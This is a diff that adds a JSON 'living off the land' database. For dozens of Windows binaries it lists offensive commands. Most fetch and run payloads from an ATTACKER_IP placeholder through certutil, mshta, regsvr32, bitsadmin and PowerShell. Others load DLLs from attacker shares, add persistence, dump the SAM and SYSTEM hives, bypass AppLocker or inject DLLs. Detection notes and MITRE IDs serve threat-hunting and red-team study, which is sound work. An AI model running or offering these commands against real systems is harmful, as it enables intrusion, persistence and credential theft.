@@ -1,0 +1,641 @@
+{
+  "version": "1.0.0",
+  "description": "Living Off The Land Binaries, Scripts and Libraries (LOLBAS) database",
+  "binaries": {
+    "certutil.exe": {
+      "path": "C:\\Windows\\System32\\certutil.exe",
+      "description": "Certificate utility for managing certificates",
+      "techniques": {
+        "download": {
+          "commands": [
+            "certutil.exe -urlcache -split -f http://ATTACKER_IP/file.exe file.exe",
+            "certutil.exe -verifyctl -f -split http://ATTACKER_IP/file.exe file.exe"
+          ],
+          "description": "Download files from remote server"
+        },
+        "encode": {
+          "commands": [
+            "certutil.exe -encode inputfile.exe encoded.txt",
+            "certutil.exe -decode encoded.txt outputfile.exe"
+          ],
+          "description": "Base64 encode/decode files for exfiltration"
+        },
+        "ads": {
+          "commands": [
+            "certutil.exe -urlcache -split -f http://ATTACKER_IP/file.exe C:\\temp\\file.txt:hidden.exe"
+          ],
+          "description": "Download to Alternate Data Stream"
+        }
+      },
+      "detection": ["Process creation", "Network connections"],
+      "mitre": ["T1105", "T1140"]
+    },
+    "mshta.exe": {
+      "path": "C:\\Windows\\System32\\mshta.exe",
+      "description": "Microsoft HTML Application Host",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "mshta.exe http://ATTACKER_IP/payload.hta",
+            "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(cmd)\"\": close\")",
+            "mshta.exe \"javascript:a=new ActiveXObject('Wscript.Shell');a.Run('powershell -ep bypass');\""
+          ],
+          "description": "Execute remote or inline HTA/VBS/JS payloads"
+        }
+      },
+      "detection": ["Process creation", "Script execution"],
+      "mitre": ["T1218.005"]
+    },
+    "msiexec.exe": {
+      "path": "C:\\Windows\\System32\\msiexec.exe",
+      "description": "Windows Installer",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "msiexec /q /i http://ATTACKER_IP/payload.msi",
+            "msiexec /y C:\\path\\to\\payload.dll",
+            "msiexec /z C:\\path\\to\\payload.dll"
+          ],
+          "description": "Install MSI packages or load DLLs"
+        }
+      },
+      "detection": ["Process creation", "MSI installation"],
+      "mitre": ["T1218.007"]
+    },
+    "regsvr32.exe": {
+      "path": "C:\\Windows\\System32\\regsvr32.exe",
+      "description": "Microsoft Register Server",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "regsvr32 /s /n /u /i:http://ATTACKER_IP/file.sct scrobj.dll",
+            "regsvr32 /s /n /u /i:C:\\path\\to\\file.sct scrobj.dll"
+          ],
+          "description": "Execute SCT scriptlets via COM"
+        }
+      },
+      "detection": ["Process creation", "Network connections"],
+      "mitre": ["T1218.010"]
+    },
+    "rundll32.exe": {
+      "path": "C:\\Windows\\System32\\rundll32.exe",
+      "description": "Windows host process for DLLs",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass\")",
+            "rundll32.exe C:\\path\\to\\payload.dll,EntryPoint",
+            "rundll32.exe shell32.dll,Control_RunDLL C:\\path\\to\\payload.cpl"
+          ],
+          "description": "Execute DLLs or inline scripts"
+        }
+      },
+      "detection": ["Process creation", "DLL loading"],
+      "mitre": ["T1218.011"]
+    },
+    "wmic.exe": {
+      "path": "C:\\Windows\\System32\\wbem\\wmic.exe",
+      "description": "Windows Management Instrumentation Command-line",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "wmic process call create \"cmd.exe /c payload.exe\"",
+            "wmic /node:REMOTE_IP process call create \"cmd.exe /c payload.exe\"",
+            "wmic os get /format:\"http://ATTACKER_IP/payload.xsl\""
+          ],
+          "description": "Execute commands locally or remotely"
+        },
+        "recon": {
+          "commands": [
+            "wmic qfe list",
+            "wmic product get name,version",
+            "wmic service list brief",
+            "wmic useraccount list"
+          ],
+          "description": "System enumeration"
+        }
+      },
+      "detection": ["Process creation", "WMI activity"],
+      "mitre": ["T1047"]
+    },
+    "cscript.exe": {
+      "path": "C:\\Windows\\System32\\cscript.exe",
+      "description": "Windows Script Host (command-line)",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "cscript.exe //E:vbscript C:\\path\\to\\script.txt",
+            "cscript.exe C:\\path\\to\\payload.vbs"
+          ],
+          "description": "Execute VBScript or JScript"
+        }
+      },
+      "detection": ["Process creation", "Script execution"],
+      "mitre": ["T1059.005"]
+    },
+    "wscript.exe": {
+      "path": "C:\\Windows\\System32\\wscript.exe",
+      "description": "Windows Script Host (GUI)",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "wscript.exe C:\\path\\to\\payload.vbs",
+            "wscript.exe //E:jscript C:\\path\\to\\script.txt"
+          ],
+          "description": "Execute VBScript or JScript"
+        }
+      },
+      "detection": ["Process creation", "Script execution"],
+      "mitre": ["T1059.005"]
+    },
+    "powershell.exe": {
+      "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "description": "PowerShell scripting engine",
+      "techniques": {
+        "download_execute": {
+          "commands": [
+            "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')\"",
+            "powershell -ep bypass -c \"IEX(IWR -Uri http://ATTACKER_IP/payload.ps1 -UseBasicParsing)\"",
+            "powershell -encodedcommand <base64_payload>"
+          ],
+          "description": "Download and execute PowerShell scripts"
+        },
+        "bypass": {
+          "commands": [
+            "powershell -exec bypass -file script.ps1",
+            "powershell -nop -w hidden -ep bypass -c \"command\"",
+            "powershell Set-ExecutionPolicy Bypass -Scope Process"
+          ],
+          "description": "Execution policy bypass techniques"
+        }
+      },
+      "detection": ["Script block logging", "Process creation", "Network"],
+      "mitre": ["T1059.001"]
+    },
+    "cmd.exe": {
+      "path": "C:\\Windows\\System32\\cmd.exe",
+      "description": "Windows Command Processor",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "cmd.exe /c payload.exe",
+            "cmd.exe /k \"command && command2\"",
+            "cmd.exe /c start /b payload.exe"
+          ],
+          "description": "Execute commands and programs"
+        }
+      },
+      "detection": ["Process creation"],
+      "mitre": ["T1059.003"]
+    },
+    "bitsadmin.exe": {
+      "path": "C:\\Windows\\System32\\bitsadmin.exe",
+      "description": "Background Intelligent Transfer Service admin",
+      "techniques": {
+        "download": {
+          "commands": [
+            "bitsadmin /transfer job /download /priority high http://ATTACKER_IP/file.exe C:\\temp\\file.exe",
+            "bitsadmin /create job & bitsadmin /addfile job http://ATTACKER_IP/file.exe C:\\temp\\file.exe & bitsadmin /resume job"
+          ],
+          "description": "Download files via BITS"
+        },
+        "execute": {
+          "commands": [
+            "bitsadmin /create job & bitsadmin /addfile job http://ATTACKER_IP/file.exe C:\\temp\\file.exe & bitsadmin /setnotifycmdline job C:\\temp\\file.exe NULL & bitsadmin /resume job"
+          ],
+          "description": "Download and execute via notification"
+        }
+      },
+      "detection": ["BITS job creation", "Network connections"],
+      "mitre": ["T1197"]
+    },
+    "cmstp.exe": {
+      "path": "C:\\Windows\\System32\\cmstp.exe",
+      "description": "Microsoft Connection Manager Profile Installer",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "cmstp.exe /s /ni /au C:\\path\\to\\payload.inf",
+            "cmstp.exe /s /ni /au http://ATTACKER_IP/payload.inf"
+          ],
+          "description": "Execute INF-based payloads"
+        }
+      },
+      "detection": ["Process creation", "INF file execution"],
+      "mitre": ["T1218.003"]
+    },
+    "msbuild.exe": {
+      "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
+      "description": "Microsoft Build Engine",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "msbuild.exe C:\\path\\to\\project.csproj",
+            "msbuild.exe C:\\path\\to\\payload.xml"
+          ],
+          "description": "Execute inline C# code in project files"
+        }
+      },
+      "detection": ["Process creation", "Compiler activity"],
+      "mitre": ["T1127.001"]
+    },
+    "installutil.exe": {
+      "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe",
+      "description": ".NET Installation utility",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "installutil.exe /logfile= /LogToConsole=false /U C:\\path\\to\\payload.exe"
+          ],
+          "description": "Execute .NET assemblies"
+        }
+      },
+      "detection": ["Process creation", ".NET assembly loading"],
+      "mitre": ["T1218.004"]
+    },
+    "regasm.exe": {
+      "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe",
+      "description": ".NET Assembly Registration Utility",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "regasm.exe /U C:\\path\\to\\payload.dll"
+          ],
+          "description": "Execute .NET DLLs"
+        }
+      },
+      "detection": ["Process creation", ".NET assembly loading"],
+      "mitre": ["T1218.009"]
+    },
+    "regsvcs.exe": {
+      "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe",
+      "description": ".NET Component Services Registration Utility",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "regsvcs.exe C:\\path\\to\\payload.dll"
+          ],
+          "description": "Execute .NET DLLs"
+        }
+      },
+      "detection": ["Process creation", ".NET assembly loading"],
+      "mitre": ["T1218.009"]
+    },
+    "ieexec.exe": {
+      "path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\IEExec.exe",
+      "description": "Internet Explorer Execute utility",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "ieexec.exe http://ATTACKER_IP/payload.exe"
+          ],
+          "description": "Download and execute from URL"
+        }
+      },
+      "detection": ["Process creation", "Network connections"],
+      "mitre": ["T1218"]
+    },
+    "forfiles.exe": {
+      "path": "C:\\Windows\\System32\\forfiles.exe",
+      "description": "Batch file processing",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"c:\\path\\to\\payload.exe\""
+          ],
+          "description": "Execute commands indirectly"
+        }
+      },
+      "detection": ["Process creation"],
+      "mitre": ["T1202"]
+    },
+    "pcalua.exe": {
+      "path": "C:\\Windows\\System32\\pcalua.exe",
+      "description": "Program Compatibility Assistant",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "pcalua.exe -a C:\\path\\to\\payload.exe"
+          ],
+          "description": "Execute programs"
+        }
+      },
+      "detection": ["Process creation"],
+      "mitre": ["T1202"]
+    },
+    "syncappvpublishingserver.exe": {
+      "path": "C:\\Windows\\System32\\SyncAppvPublishingServer.exe",
+      "description": "App-V Publishing Server sync",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "SyncAppvPublishingServer.exe \"n; Start-Process cmd.exe\""
+          ],
+          "description": "Execute PowerShell commands"
+        }
+      },
+      "detection": ["Process creation", "Script execution"],
+      "mitre": ["T1218"]
+    },
+    "dnscmd.exe": {
+      "path": "C:\\Windows\\System32\\dnscmd.exe",
+      "description": "DNS Server management",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "dnscmd.exe /config /serverlevelplugindll \\\\ATTACKER_IP\\share\\payload.dll"
+          ],
+          "description": "Load malicious DLL on DNS server"
+        }
+      },
+      "detection": ["DNS server configuration", "DLL loading"],
+      "mitre": ["T1574.002"],
+      "notes": "Requires DNS server role"
+    },
+    "odbcconf.exe": {
+      "path": "C:\\Windows\\System32\\odbcconf.exe",
+      "description": "ODBC configuration utility",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "odbcconf.exe /a {regsvr \\\\ATTACKER_IP\\share\\payload.dll}",
+            "odbcconf.exe -f payload.rsp"
+          ],
+          "description": "Load DLLs via ODBC"
+        }
+      },
+      "detection": ["Process creation", "DLL loading"],
+      "mitre": ["T1218.008"]
+    },
+    "infdefaultinstall.exe": {
+      "path": "C:\\Windows\\System32\\InfDefaultInstall.exe",
+      "description": "INF file installer",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "InfDefaultInstall.exe C:\\path\\to\\payload.inf"
+          ],
+          "description": "Execute INF-based payloads"
+        }
+      },
+      "detection": ["Process creation", "INF file execution"],
+      "mitre": ["T1218"]
+    },
+    "diskshadow.exe": {
+      "path": "C:\\Windows\\System32\\diskshadow.exe",
+      "description": "Disk shadow copy utility",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "diskshadow.exe /s C:\\path\\to\\script.txt",
+            "# script.txt: exec c:\\path\\to\\payload.exe"
+          ],
+          "description": "Execute commands via script mode"
+        }
+      },
+      "detection": ["Process creation", "Shadow copy activity"],
+      "mitre": ["T1218"]
+    },
+    "presentationhost.exe": {
+      "path": "C:\\Windows\\System32\\PresentationHost.exe",
+      "description": "XAML Browser Application host",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "PresentationHost.exe C:\\path\\to\\payload.xbap"
+          ],
+          "description": "Execute XBAP applications"
+        }
+      },
+      "detection": ["Process creation", "XAML execution"],
+      "mitre": ["T1218"]
+    },
+    "ftp.exe": {
+      "path": "C:\\Windows\\System32\\ftp.exe",
+      "description": "FTP client",
+      "techniques": {
+        "download": {
+          "commands": [
+            "ftp -s:C:\\path\\to\\commands.txt",
+            "# commands.txt: open ATTACKER_IP\\nuser\\npass\\nbinary\\nget payload.exe\\nbye"
+          ],
+          "description": "Download files via FTP"
+        }
+      },
+      "detection": ["Process creation", "Network connections"],
+      "mitre": ["T1105"]
+    },
+    "replace.exe": {
+      "path": "C:\\Windows\\System32\\replace.exe",
+      "description": "File replacement utility",
+      "techniques": {
+        "copy": {
+          "commands": [
+            "replace.exe C:\\source\\file.exe C:\\destination\\ /A"
+          ],
+          "description": "Copy files to directories"
+        }
+      },
+      "detection": ["File operations"],
+      "mitre": ["T1105"]
+    },
+    "findstr.exe": {
+      "path": "C:\\Windows\\System32\\findstr.exe",
+      "description": "String search utility",
+      "techniques": {
+        "download": {
+          "commands": [
+            "findstr /V \"\" \\\\ATTACKER_IP\\share\\payload.exe > C:\\temp\\payload.exe"
+          ],
+          "description": "Download files via SMB"
+        }
+      },
+      "detection": ["SMB connections", "File operations"],
+      "mitre": ["T1105"]
+    },
+    "sc.exe": {
+      "path": "C:\\Windows\\System32\\sc.exe",
+      "description": "Service Control manager",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "sc create malicious binPath= \"C:\\path\\to\\payload.exe\" start= auto",
+            "sc start malicious"
+          ],
+          "description": "Create and start malicious services"
+        }
+      },
+      "detection": ["Service creation", "Registry modification"],
+      "mitre": ["T1543.003"]
+    },
+    "schtasks.exe": {
+      "path": "C:\\Windows\\System32\\schtasks.exe",
+      "description": "Task Scheduler configuration",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "schtasks /create /tn \"task\" /tr C:\\path\\to\\payload.exe /sc once /st 00:00 /ru SYSTEM",
+            "schtasks /run /tn \"task\""
+          ],
+          "description": "Create and run scheduled tasks"
+        }
+      },
+      "detection": ["Scheduled task creation"],
+      "mitre": ["T1053.005"]
+    },
+    "at.exe": {
+      "path": "C:\\Windows\\System32\\at.exe",
+      "description": "Legacy task scheduler (deprecated)",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "at 12:00 /interactive C:\\path\\to\\payload.exe"
+          ],
+          "description": "Schedule task execution"
+        }
+      },
+      "detection": ["Scheduled task creation"],
+      "mitre": ["T1053.002"],
+      "notes": "Deprecated, may not work on newer systems"
+    },
+    "reg.exe": {
+      "path": "C:\\Windows\\System32\\reg.exe",
+      "description": "Registry console tool",
+      "techniques": {
+        "persistence": {
+          "commands": [
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /t REG_SZ /d C:\\path\\to\\payload.exe",
+            "reg save HKLM\\SAM C:\\temp\\sam.save",
+            "reg save HKLM\\SYSTEM C:\\temp\\system.save"
+          ],
+          "description": "Modify registry for persistence or dump credentials"
+        }
+      },
+      "detection": ["Registry modification"],
+      "mitre": ["T1547.001", "T1003.002"]
+    },
+    "esentutl.exe": {
+      "path": "C:\\Windows\\System32\\esentutl.exe",
+      "description": "Extensible Storage Engine utility",
+      "techniques": {
+        "copy": {
+          "commands": [
+            "esentutl.exe /y C:\\source\\file.exe /d C:\\dest\\file.exe /o",
+            "esentutl.exe /y \\\\ATTACKER_IP\\share\\file.exe /d C:\\temp\\file.exe /o"
+          ],
+          "description": "Copy files including locked files"
+        }
+      },
+      "detection": ["File operations"],
+      "mitre": ["T1105"]
+    },
+    "expand.exe": {
+      "path": "C:\\Windows\\System32\\expand.exe",
+      "description": "CAB file expansion utility",
+      "techniques": {
+        "copy": {
+          "commands": [
+            "expand \\\\ATTACKER_IP\\share\\file.exe C:\\temp\\file.exe"
+          ],
+          "description": "Download/copy files"
+        }
+      },
+      "detection": ["SMB connections", "File operations"],
+      "mitre": ["T1105"]
+    },
+    "extrac32.exe": {
+      "path": "C:\\Windows\\System32\\extrac32.exe",
+      "description": "CAB extraction utility",
+      "techniques": {
+        "copy": {
+          "commands": [
+            "extrac32 /Y /C \\\\ATTACKER_IP\\share\\file.exe C:\\temp\\file.exe"
+          ],
+          "description": "Download/copy files via SMB"
+        }
+      },
+      "detection": ["SMB connections", "File operations"],
+      "mitre": ["T1105"]
+    },
+    "makecab.exe": {
+      "path": "C:\\Windows\\System32\\makecab.exe",
+      "description": "CAB file creation utility",
+      "techniques": {
+        "exfiltrate": {
+          "commands": [
+            "makecab C:\\secret\\file.txt C:\\temp\\file.cab"
+          ],
+          "description": "Compress files for exfiltration"
+        }
+      },
+      "detection": ["File operations"],
+      "mitre": ["T1560.001"]
+    },
+    "hh.exe": {
+      "path": "C:\\Windows\\System32\\hh.exe",
+      "description": "HTML Help executable",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "hh.exe C:\\path\\to\\payload.chm",
+            "hh.exe http://ATTACKER_IP/payload.chm"
+          ],
+          "description": "Execute CHM help files"
+        }
+      },
+      "detection": ["Process creation", "Network connections"],
+      "mitre": ["T1218.001"]
+    },
+    "control.exe": {
+      "path": "C:\\Windows\\System32\\control.exe",
+      "description": "Windows Control Panel",
+      "techniques": {
+        "execute": {
+          "commands": [
+            "control.exe C:\\path\\to\\payload.cpl"
+          ],
+          "description": "Execute CPL files"
+        }
+      },
+      "detection": ["Process creation", "DLL loading"],
+      "mitre": ["T1218.002"]
+    },
+    "mavinject.exe": {
+      "path": "C:\\Windows\\System32\\mavinject.exe",
+      "description": "Application Verifier injection",
+      "techniques": {
+        "inject": {
+          "commands": [
+            "mavinject.exe <PID> /INJECTRUNNING C:\\path\\to\\payload.dll"
+          ],
+          "description": "Inject DLL into running process"
+        }
+      },
+      "detection": ["Process injection", "DLL loading"],
+      "mitre": ["T1218.013"]
+    }
+  },
+  "scripts": {
+    "powershell_constrained_bypass": {
+      "techniques": [
+        "powershell -version 2",
+        "Add-Type with C# compilation",
+        "Use of System.Management.Automation.dll directly"
+      ]
+    },
+    "applocker_bypass": {
+      "techniques": [
+        "msbuild.exe with inline C#",
+        "installutil.exe /U",
+        "regasm.exe /U",
+        "regsvcs.exe"
+      ]
+    }
+  },
+  "metadata": {
+    "source": "LOLBAS Project (https://lolbas-project.github.io/)",
+    "total_binaries": 40,
+    "categories": ["execute", "download", "copy", "encode", "persist", "inject"],
+    "last_updated": "2024"
+  }
+}
